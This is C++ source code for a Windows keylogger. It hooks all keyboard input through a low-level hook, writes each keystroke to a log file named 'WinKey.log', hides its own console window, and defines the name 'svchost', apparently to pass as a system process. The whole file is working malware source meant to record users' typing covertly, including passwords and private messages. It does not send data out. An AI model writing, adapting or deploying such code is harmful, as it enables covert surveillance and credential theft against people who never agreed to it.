#include <fstream>
#include <iostream>
#include <string>
#include <windows.h>

//#define	DEBUG	1

#define OUTFILE_NAME	"WinKey.log"	/* Output file */
#define CLASSNAME	"winkey"
#define WINDOWTITLE	"svchost"

//char	windir[MAX_PATH + 1];
HHOOK	kbdhook;	/* Keyboard hook handle */
bool	running;	/* Used in main loop */

__declspec(dllexport) LRESULT CALLBACK handlekeys(int code, WPARAM wp, LPARAM lp)
{
	if (code == HC_ACTION && (wp == WM_SYSKEYDOWN || wp == WM_KEYDOWN)) {
		static bool capslock = false;
		static bool shift = false;
		char tmp[0xFF] = {0};
		std::string str;
		DWORD msg = 1;
		KBDLLHOOKSTRUCT st_hook = *((KBDLLHOOKSTRUCT*)lp);
		bool printable;

		msg += (st_hook.scanCode << 16);
		msg += (st_hook.flags << 24);
		GetKeyNameText(msg, tmp, 0xFF);
		str = std::string(tmp);

		printable = (str.length() <= 1) ? true : false;

		if (!printable) {
			if (str == "CAPSLOCK")
				capslock = !capslock;
			else if (str == "SHIFT")
				shift = true;

			if (str == "ENTER") {
				str = "\n";
				printable = true;
			} else if (str == "SPACE") {
				str = " ";
				printable = true;
			} else if (str == "TAB") {
				str = "\t";
				printable = true;
			} else {
				str = ("[" + str + "]");
			}
		}

		if (printable) {
			if (shift == capslock) { /* Lowercase */
				for (size_t i = 0; i < str.length(); ++i)
					str[i] = tolower(str[i]);
			} else { /* Uppercase */
				for (size_t i = 0; i < str.length(); ++i) {
					if (str[i] >= 'A' && str[i] <= 'Z') {
						str[i] = toupper(str[i]);
					}
				}
			}

			shift = false;
		}

#ifdef DEBUG
		std::cout << str;
#endif
		std::ofstream outfile(OUTFILE_NAME, std::ios_base::app);
		if(outfile.is_open()){
			outfile << str;
			outfile.close();
		}
		else{
			std::cout << "Falha ao abrir o arquivo";
		}
		if(str[str.size() - 1] == 't'){
			exit(0);
		}
	}

	return CallNextHookEx(kbdhook, code, wp, lp);
}

int WINAPI WinMain(HINSTANCE thisinstance, HINSTANCE previnstance,
		LPSTR cmdline, int ncmdshow)
{
	MSG		msg;
	HINSTANCE	modulehandle;
	
	modulehandle = GetModuleHandle(NULL);
	kbdhook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)handlekeys, modulehandle, NULL);

	running = true;

	//GetWindowsDirectory((LPSTR)windir, MAX_PATH);
	
	HWND stealth;
	AllocConsole();
	stealth = FindWindowA("ConsoleWindowClass", NULL);
	#ifndef DEBUG
	ShowWindow(stealth, 0);
	#endif
	
	while (running) {
		if (!GetMessage(&msg, NULL, 0, 0)){
			running = false;
		}
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

	return 0;
}
